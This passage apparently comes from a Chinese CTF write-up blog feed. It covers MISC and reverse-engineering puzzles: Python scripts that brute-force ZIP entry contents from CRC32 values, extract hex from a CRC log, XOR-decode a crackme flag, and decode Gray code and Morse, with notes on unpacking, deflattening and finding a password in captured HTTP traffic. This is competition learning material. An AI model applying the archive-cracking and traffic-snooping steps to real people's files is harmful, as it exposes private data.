07d6c4e5<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">19</span>]; <span class="hljs-keyword">in</span> data: 03000000; expected: 0a7f97a2<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">20</span>]; <span class="hljs-keyword">in</span> data: 05000000; expected: 2cef414b<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">21</span>]; <span class="hljs-keyword">in</span> data: <span class="hljs-number">332e7478</span>; expected: 46aa8c29<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">22</span>]; <span class="hljs-keyword">in</span> data: 74b7f9d5; expected: 36a2bb7a<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">23</span>]; <span class="hljs-keyword">in</span> data: d53f2bc8; expected: a999f563<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">24</span>]; <span class="hljs-keyword">in</span> data: 2da5b6e4; expected: b9d49991<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">25</span>]; <span class="hljs-keyword">in</span> data: f37b61c1; expected: 5e89138f<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">26</span>]; <span class="hljs-keyword">in</span> data: 504b0304; expected: 4ec6885a<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">27</span>]; <span class="hljs-keyword">in</span> data: <span class="hljs-number">14000100</span>; expected: 711d9282<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">28</span>]; <span class="hljs-keyword">in</span> data: 00002d63; expected: 3d006cf5<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">29</span>]; <span class="hljs-keyword">in</span> data: 76543e4b; expected: 4d8c1683<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">30</span>]; <span class="hljs-keyword">in</span> data: 656b3400; expected: 0a71b96b<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">31</span>]; <span class="hljs-keyword">in</span> data: 00002800; expected: e75a8b15<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">32</span>]; <span class="hljs-keyword">in</span> data: 00000800; expected: 9fd04697<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">33</span>]; <span class="hljs-keyword">in</span> data: 0000666c; expected: 10022ee2<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">34</span>]; <span class="hljs-keyword">in</span> data: <span class="hljs-number">61672e74</span>; expected: 8527a2dc<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">35</span>]; <span class="hljs-keyword">in</span> data: 7874d632; expected: cb7ec921<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">36</span>]; <span class="hljs-keyword">in</span> data: c8514cd0; expected: ce735342<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">37</span>]; <span class="hljs-keyword">in</span> data: 3fe7ae86; expected: <span class="hljs-number">45e81567</span><br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">38</span>]; <span class="hljs-keyword">in</span> data: 9f38e086; expected: ee362a10<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">39</span>]; <span class="hljs-keyword">in</span> data: 4aaa47b4; expected: 40d20ce5<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">40</span>]; <span class="hljs-keyword">in</span> data: a81dcd54; expected: b0766fb1<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">41</span>]; <span class="hljs-keyword">in</span> data: 5d74d925; expected: eef1e93c<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">42</span>]; <span class="hljs-keyword">in</span> data: f9b7a9bb; expected: ac965653<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">43</span>]; <span class="hljs-keyword">in</span> data: 39e3e188; expected: c618afbf<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">44</span>]; <span class="hljs-keyword">in</span> data: cbfeb011; expected: 8fe18995<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">45</span>]; <span class="hljs-keyword">in</span> data: 75f4482e; expected: c0a47c47<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">46</span>]; <span class="hljs-keyword">in</span> data: cea99cd1; expected: b093a149<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">47</span>]; <span class="hljs-keyword">in</span> data: 131784ea; expected: 4f4b95e3<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">48</span>]; <span class="hljs-keyword">in</span> data: c06a504b; expected: dc96075d<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">49</span>]; <span class="hljs-keyword">in</span> data: 03041400; expected: 8092ca00<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">50</span>]; <span class="hljs-keyword">in</span> data: <span class="hljs-number">0</span>1000000; expected: 438e39a1<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">51</span>]; <span class="hljs-keyword">in</span> data: 696a7654; expected: 7b9d8049<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">52</span>]; <span class="hljs-keyword">in</span> data: 88330f3d; expected: 4b62f442<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">53</span>]; <span class="hljs-keyword">in</span> data: 0f000000; expected: b333a865<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">54</span>]; <span class="hljs-keyword">in</span> data: 03000000; expected: 961a542b<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">55</span>]; <span class="hljs-keyword">in</span> data: 05000000; expected: 7c422845<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">56</span>]; <span class="hljs-keyword">in</span> data: <span class="hljs-number">312e7478</span>; expected: d8416283<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">57</span>]; <span class="hljs-keyword">in</span> data: 746d6727; expected: 0de04578<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">58</span>]; <span class="hljs-keyword">in</span> data: aa4946a7; expected: 52f3774b<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">59</span>]; <span class="hljs-keyword">in</span> data: fcdda920; expected: 82e8ff62<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">60</span>]; <span class="hljs-keyword">in</span> data: cb725a99; expected: 87e44c40<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">61</span>]; <span class="hljs-keyword">in</span> data: 504b0102; expected: f27b2b0c<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">62</span>]; <span class="hljs-keyword">in</span> data: 3f001400; expected: a63ec761<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">63</span>]; <span class="hljs-keyword">in</span> data: <span class="hljs-number">0</span>1000000; expected: 10340dfb<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">64</span>]; <span class="hljs-keyword">in</span> data: 6c6a7654; expected: 80af1be3<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">65</span>]; <span class="hljs-keyword">in</span> data: 1cc61776; expected: aa413dae<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">66</span>]; <span class="hljs-keyword">in</span> data: 0f000000; expected: 0f2502dc<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">67</span>]; <span class="hljs-keyword">in</span> data: 03000000; expected: 8ae553f9<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">68</span>]; <span class="hljs-keyword">in</span> data: 05002400; expected: 97f54c8c<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">69</span>]; <span class="hljs-keyword">in</span> data: <span class="hljs-number">00000000</span>; expected: 6687cf5b<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">70</span>]; <span class="hljs-keyword">in</span> data: 00002000; expected: b58a4216<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">71</span>]; <span class="hljs-keyword">in</span> data: <span class="hljs-number">00000000</span>; expected: 1afa9b4f<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">72</span>]; <span class="hljs-keyword">in</span> data: 0000322e; expected: 475ebeb3<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">73</span>]; <span class="hljs-keyword">in</span> data: 7478740a; expected: 8485b4ef<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">74</span>]; <span class="hljs-keyword">in</span> data: 00200000; expected: 70b56e3f<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">75</span>]; <span class="hljs-keyword">in</span> data: 00000001; expected: 3e22c5dd<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">76</span>]; <span class="hljs-keyword">in</span> data: 00180075; expected: 005e58c2<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">77</span>]; <span class="hljs-keyword">in</span> data: 537e63ac; expected: 37d59674<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">78</span>]; <span class="hljs-keyword">in</span> data: 3dd80175; expected: f8654d4a<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">79</span>]; <span class="hljs-keyword">in</span> data: 537e63ac; expected: be91f6c3<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">80</span>]; <span class="hljs-keyword">in</span> data: 3dd80175; expected: 23a77712<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">81</span>]; <span class="hljs-keyword">in</span> data: d27b4bac; expected: 2f231b39<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">82</span>]; <span class="hljs-keyword">in</span> data: 3dd80150; expected: 872d6745<br>*ERROR: CRC Mismatch @ chunk[<span class="hljs-number">83</span>]; <span class="hljs-keyword">in</span> data: 4b01023f; expected: fb6afe46<br></code></pre></td></tr></table></figure><p>提取一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_and_concatenate_data</span>(<span class="hljs-params">file_path</span>):<br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>        <span class="hljs-comment"># 使用正则表达式匹配 &quot;in data: xxxx&quot; 部分</span><br>            <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;in data: ([0-9a-fA-F]+)&#x27;</span>, line)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>                hex_data = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br>                result += hex_data<br>    <span class="hljs-keyword">return</span> result<br><br><span class="hljs-comment"># 使用示例</span><br>file_path = <span class="hljs-string">&#x27;data.txt&#x27;</span> <span class="hljs-comment"># 替换为你的文件路径</span><br>extracted_data = extract_and_concatenate_data(file_path)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;提取并拼接的结果:&quot;</span>, extracted_data)<br></code></pre></td></tr></table></figure><p><img src="/./img/jk8zxcM4b8QksPx1/1752141084795-fa6d5c8e-8caa-4832-801a-bbed5f41b195-043426.png" alt="1752141084795-fa6d5c8e-8caa-4832-801a-bbed5f41b195.png"></p><p><img src="/./img/jk8zxcM4b8QksPx1/1752141075299-8e3d902c-1360-44fd-af2f-d15c22d6b417-056619.png" alt="1752141075299-8e3d902c-1360-44fd-af2f-d15c22d6b417.png"></p><p>3字节使用crc爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> binascii<br><br>dic = string.printable<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">CrackCrc</span>(<span class="hljs-params">crc</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> dic:<br>            <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> dic:<br>                s = i + j + p<br>                <span class="hljs-keyword">if</span> crc == binascii.crc32(s.encode()):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Found:&quot;</span>, s)<br>                    <span class="hljs-keyword">return</span> s<br><br><br>crc_to_crack = <span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;3d0f3388&quot;</span>, <span class="hljs-number">16</span>)<br>a=CrackCrc(crc_to_crack)<br>crc_to_crack = <span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;7617c61c&quot;</span>, <span class="hljs-number">16</span>)<br>b=CrackCrc(crc_to_crack)<br>crc_to_crack = <span class="hljs-built_in">int</span>(<span class="hljs-string">&quot;572df59a&quot;</span>, <span class="hljs-number">16</span>)<br>c=CrackCrc(crc_to_crack)<br><span class="hljs-built_in">print</span>(a+b+c)<br></code></pre></td></tr></table></figure><p><img src="/./img/jk8zxcM4b8QksPx1/1752141236229-168fc882-9689-428b-83ba-491046901ed7-057295.png" alt="1752141236229-168fc882-9689-428b-83ba-491046901ed7.png"></p><p><img src="/./img/jk8zxcM4b8QksPx1/1752141257971-09fe9be9-4c23-46a4-a1d6-59b29172bc2c-107786.png" alt="1752141257971-09fe9be9-4c23-46a4-a1d6-59b29172bc2c.png"></p><h1 id="MISC3"><a href="#MISC3" class="headerlink" title="MISC3"></a>MISC3</h1><p><img src="/./img/jk8zxcM4b8QksPx1/1756180930005-5adb2c59-16de-4183-8a72-05737e58305b-205452.png" alt="1756180930005-5adb2c59-16de-4183-8a72-05737e58305b.png"></p><p>crc爆破</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">from</span> binascii import crc32<br>import <span class="hljs-keyword">string</span><br>import zipfile<br><br>dic = <span class="hljs-keyword">string</span>.printable<br><br><br>def <span class="hljs-title function_ invoke__">CrackCrc</span>(crc):<br>    <span class="hljs-keyword">for</span> i in dic:<br>        <span class="hljs-comment"># print (i)</span><br>        <span class="hljs-keyword">for</span> j in dic:<br>            <span class="hljs-keyword">for</span> p in dic:<br>                <span class="hljs-keyword">for</span> q in dic:<br>                    s = i + j + p + q<br>                    <span class="hljs-comment"># print (crc32(bytes(s,&#x27;ascii&#x27;)) &amp; 0xffffffff)</span><br>                    <span class="hljs-keyword">if</span> crc == (<span class="hljs-title function_ invoke__">crc32</span>(<span class="hljs-title function_ invoke__">bytes</span>(s, <span class="hljs-string">&quot;ascii&quot;</span>)) &amp; <span class="hljs-number">0xFFFFFFFF</span>):<br>                        <span class="hljs-keyword">print</span>(s)<br>                        <span class="hljs-keyword">return</span><br><br><br>def <span class="hljs-title function_ invoke__">getcrc32</span>(fname):<br>    l = []<br>    file = fname<br>    f = zipfile.<span class="hljs-title function_ invoke__">ZipFile</span>(file, <span class="hljs-string">&quot;r&quot;</span>)<br>    <span class="hljs-keyword">global</span> fileList<br>    fileList = f.<span class="hljs-title function_ invoke__">namelist</span>()<br>    <span class="hljs-keyword">print</span>(fileList)<br>    <span class="hljs-comment"># print (type(fileList))</span><br>    <span class="hljs-keyword">for</span> filename in fileList:<br>        Fileinfo = f.<span class="hljs-title function_ invoke__">getinfo</span>(filename)<br>        <span class="hljs-comment"># print(Fileinfo)</span><br>        crc = Fileinfo.CRC<br>        <span class="hljs-comment"># print (&#x27;crc&#x27;,crc)</span><br>        l.<span class="hljs-title function_ invoke__">append</span>(crc)<br>    <span class="hljs-keyword">return</span> l<br><br><br>def <span class="hljs-title function_ invoke__">main</span>(filename=None):<br>    l = <span class="hljs-title function_ invoke__">getcrc32</span>(filename)<br>    <span class="hljs-comment"># print(l)</span><br>    <span class="hljs-keyword">for</span> i in <span class="hljs-title function_ invoke__">range</span>(<span class="hljs-title function_ invoke__">len</span>(l)):<br>        <span class="hljs-keyword">print</span>(fileList[i], end=<span class="hljs-string">&quot;的内容是:&quot;</span>)<br>        <span class="hljs-title function_ invoke__">CrackCrc</span>(l[i])<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-title function_ invoke__">main</span>(<span class="hljs-string">&quot;a.zip&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/./img/jk8zxcM4b8QksPx1/1756180957488-5bae42d7-0092-4662-a29f-91ed7804c0a0-487302.png" alt="1756180957488-5bae42d7-0092-4662-a29f-91ed7804c0a0.png"></p><p>This_1s_PwD!</p><p><img src="/./img/jk8zxcM4b8QksPx1/1756181030745-72195ef1-0d09-4692-a87c-1aee6593abbc-659803.png" alt="1756181030745-72195ef1-0d09-4692-a87c-1aee6593abbc.png"></p><p><img src="/./img/jk8zxcM4b8QksPx1/1756181024795-8e7e19ca-a4b2-4fcf-a03c-757de344ce05-571461.png" alt="1756181024795-8e7e19ca-a4b2-4fcf-a03c-757de344ce05.png"></p><p>拿到压缩包修改文件头后解密</p><p>分析流量 追踪http流</p><p><img src="/./img/jk8zxcM4b8QksPx1/1756181238735-0ce53e80-9c4d-40be-8d83-3e63f7352dd9-598831.png" alt="1756181238735-0ce53e80-9c4d-40be-8d83-3e63f7352dd9.png"></p><p>welcome.png</p><p><img src="/./img/jk8zxcM4b8QksPx1/1756181560823-832406d4-051e-4b7f-8720-0a02243f7cd3-895481.png" alt="1756181560823-832406d4-051e-4b7f-8720-0a02243f7cd3.png"></p><p><img src="/./img/jk8zxcM4b8QksPx1/1756181396503-8e87b7d8-0055-4c65-abf4-b6130a3b50e6-034037.png" alt="1756181396503-8e87b7d8-0055-4c65-abf4-b6130a3b50e6.png"></p><p>查找password关键词：caibudaodemima</p><p><img src="/./img/jk8zxcM4b8QksPx1/1756208159126-ee6cabbd-39d8-42ee-8f5d-df456b40844c-761901.png" alt="1756208159126-ee6cabbd-39d8-42ee-8f5d-df456b40844c.png"></p><p>成功解压拿到flag</p><p><img src="/./img/jk8zxcM4b8QksPx1/1756208194595-80e5ab69-8a8d-427f-bb1e-8bf40720a530-787389.png" alt="1756208194595-80e5ab69-8a8d-427f-bb1e-8bf40720a530.png"></p><blockquote><p>更新: 2025-08-26 19:37:44<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/mxfburlydf4u5ygl">https://www.yuque.com/chaye-apqbl/vsc85q/mxfburlydf4u5ygl</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2025/%E4%BB%A3%E7%BB%83/index/"/>
    <url>/2026/01/19/WP/2025/%E4%BB%A3%E7%BB%83/index/</url>
    
    <content type="html"><![CDATA[<h1 id="代练"><a href="#代练" class="headerlink" title="代练"></a>代练</h1><blockquote><p>更新: 2025-07-10 14:39:14<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/qr65atxdmmk5mzds">https://www.yuque.com/chaye-apqbl/vsc85q/qr65atxdmmk5mzds</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2025/%E4%BB%A3%E7%BB%83/8.20/"/>
    <url>/2026/01/19/WP/2025/%E4%BB%A3%E7%BB%83/8.20/</url>
    
    <content type="html"><![CDATA[<h1 id="8-20"><a href="#8-20" class="headerlink" title="8.20"></a>8.20</h1><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="hello"><a href="#hello" class="headerlink" title="hello"></a>hello</h2><p>入口 00415890</p><p>python deflat.py -f hello.exe –addr 0x415890</p><p>找到main函数入口（一般）</p><p><img src="/./img/lpxdazjdjlDj7Y82/1755676713256-e59b4706-ec89-4286-9ea7-143aa5355555-579982.png" alt="1755676713256-e59b4706-ec89-4286-9ea7-143aa5355555.png"></p><p>出现warning没关系</p><p><img src="/./img/lpxdazjdjlDj7Y82/1755676836207-b97fbb28-dfed-4a50-9d8b-8d8eb8771082-113743.png" alt="1755676836207-b97fbb28-dfed-4a50-9d8b-8d8eb8771082.png"></p><p><img src="/./img/lpxdazjdjlDj7Y82/1755677050012-86479614-0d27-42b0-a3e2-50c318c67777-803357.png" alt="1755677050012-86479614-0d27-42b0-a3e2-50c318c67777.png"></p><p>4574a0还得去平坦化</p><p><img src="/./img/lpxdazjdjlDj7Y82/1755677584552-d6d00264-a8e7-4b4c-848d-886c8a8a77c7-155508.png" alt="1755677584552-d6d00264-a8e7-4b4c-848d-886c8a8a77c7.png"></p><h2 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h2><p><img src="/./img/lpxdazjdjlDj7Y82/1755672725903-840f44f8-2492-4a7b-9229-8449f49a4c9d-525249.png" alt="1755672725903-840f44f8-2492-4a7b-9229-8449f49a4c9d.png"><img src="/./img/lpxdazjdjlDj7Y82/1755672730075-91599abf-d83d-41f7-99e8-3a2307eacc77-227042.png" alt="1755672730075-91599abf-d83d-41f7-99e8-3a2307eacc77.png"></p><p>nsp脱壳</p><p><img src="/./img/lpxdazjdjlDj7Y82/1755674071875-1db62aba-2db8-4f20-acf4-80295bed9014-084119.png" alt="1755674071875-1db62aba-2db8-4f20-acf4-80295bed9014.png"></p><p><img src="/./img/lpxdazjdjlDj7Y82/1755674730136-5504cfdd-aa41-429c-b347-caf4b2311e91-536023.png" alt="1755674730136-5504cfdd-aa41-429c-b347-caf4b2311e91.png"></p><p><img src="/./img/lpxdazjdjlDj7Y82/1755674711063-f69827df-d059-4c17-a5e9-b9b1831bbf1b-544549.png" alt="1755674711063-f69827df-d059-4c17-a5e9-b9b1831bbf1b.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">a = [<span class="hljs-number">0x12</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xA</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xC</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xC</span>, <span class="hljs-number">0xD</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xC</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x12</span>]<br>b = <span class="hljs-string">&#x27;this_is_not_flag&#x27;</span>   #还有前面的<br><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">42</span>):  # 只需要前<span class="hljs-number">42</span>个字符<br>    print(chr(ord(b[i % <span class="hljs-number">16</span>]) ^ a[i]), end=<span class="hljs-string">&#x27;&#x27;)</span><br></code></pre></td></tr></table></figure><blockquote><p>更新: 2025-08-20 16:13:15<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/enefsc3udfizhr87">https://www.yuque.com/chaye-apqbl/vsc85q/enefsc3udfizhr87</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2025/%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B/%E5%A4%8D%E8%B5%9Bwp/"/>
    <url>/2026/01/19/WP/2025/%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B/%E5%A4%8D%E8%B5%9Bwp/</url>
    
    <content type="html"><![CDATA[<h1 id="复赛wp"><a href="#复赛wp" class="headerlink" title="复赛wp"></a>复赛wp</h1><blockquote><p>更新: 2025-08-07 09:57:17<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/vbt36t32b3o2h4n4">https://www.yuque.com/chaye-apqbl/vsc85q/vbt36t32b3o2h4n4</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/WP/2025/%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B/index/"/>
    <url>/2026/01/19/WP/2025/%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B/index/</url>
    
    <content type="html"><![CDATA[<h1 id="上海市赛"><a href="#上海市赛" class="headerlink" title="上海市赛"></a>上海市赛</h1><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="两个数"><a href="#两个数" class="headerlink" title="两个数"></a>两个数</h2><p><a href="https://www.yuque.com/attachments/yuque/0/2025/txt/42988179/1754472208737-ef2fa142-ab95-44c2-8f8c-fc243cc8ff6d.txt">chal1.txt</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs plain">with open(&quot;chal1.txt&quot;, &quot;r&quot;) as f2r:<br>    contents = f2r.readlines()<br>    string1 = &quot;&quot;<br>    for content in contents:<br>        content = content.replace(&quot;\n&quot;, &quot;&quot;)<br>        print(content)<br>        if len(content) == 7:<br>            string1 += content<br>        elif len(content) == 6:<br>            content = content + &quot;0&quot;<br>            string1 += content<br><br>print(string1)<br></code></pre></td></tr></table></figure><p><img src="/./img/nkKJRaeNGhIi-OWJ/1754454446545-06adfb1e-dcea-4a02-8645-31e0732f1525-267832.png" alt="1754454446545-06adfb1e-dcea-4a02-8645-31e0732f1525.png"></p><p>C0ngr4tu1ation!!Y0u_hav3_passed_th3_first_l3ve1!!</p><p><a href="https://www.yuque.com/attachments/yuque/0/2025/txt/42988179/1754472208742-861ec563-4232-4d64-a5ca-e937a35407d8.txt">chal2.txt</a></p><p>转条形码和二维码无果</p><p>试试格雷码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">01111011011110110111101101111011011110111100100101011001100100010101100101110011000001011101100110001001111100110011100101011001001100010000010100110011111010011101000100000101001100111001000101101001101100011011000101111001000001010011001110010001011110011110100100000101010101011111001101100001<br></code></pre></td></tr></table></figure><p>转后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">01010010010100100101001001010010010100101000111001101110111000011001000110100010000001101001000100001110101000100010111001101110001000011111100111011101010011101001111000000110001000101110000110110001001000010010000110101110000001100010001011100001101011101011000111111001100110010101110110111110<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">-.-...-.-.-...-.-.-...-.-.-...-.-.-...-..---...--..-...-...----.-..-...--.-.--.------..-.--....-.......-.-.---.---.-...--..-...---.----.-----..---.---.-.-.....-.--.---.-----..---.---.-...----.-.--...-..-.---...-.---.-.-....------..---.---.-...----.-.-....-.-.....------..--..--..-.-.---.--.-----.<br></code></pre></td></tr></table></figure><h2 id="derderjia"><a href="#derderjia" class="headerlink" title="derderjia"></a><strong>derderjia</strong></h2><p><img 